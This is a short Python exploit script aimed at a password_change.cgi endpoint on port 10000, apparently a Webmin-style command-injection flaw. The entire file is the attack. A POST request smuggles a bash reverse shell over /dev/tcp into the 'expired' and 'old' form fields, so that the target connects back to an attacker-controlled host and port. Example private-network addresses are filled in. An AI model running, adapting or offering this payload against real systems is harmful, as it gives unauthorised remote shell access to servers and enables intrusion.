import requests

def exploit(target, lhost, lport):
    exploit_target = (
        f"https://{target}:10000{vuln_path}"
    )
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.47',
        'Referer': f'https://{target}:10000/',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    data = {
        'expired': f"bash -c '0<&66-;exec 66<>/dev/tcp/{lhost}/{lport};sh <&66 >&66 2>&66'",
        'new1': 'SmKUYgMFtixFlLt6nggby',
        'new2': 'SmKUYgMFtixFlLt6nggby',
        'old': f"bash -c '0<&66-;exec 66<>/dev/tcp/{lhost}/{lport};sh <&66 >&66 2>&66'"
    }
    requests.post(exploit_target, headers=headers, data=data)
    print("Exploit script executed successfully.")
    exit()

# Example usage:
target = "192.168.1.67"
lhost = "192.168.1.72"
lport = "4443"
vuln_path = "/password_change.cgi"
exploit(target, lhost, lport)
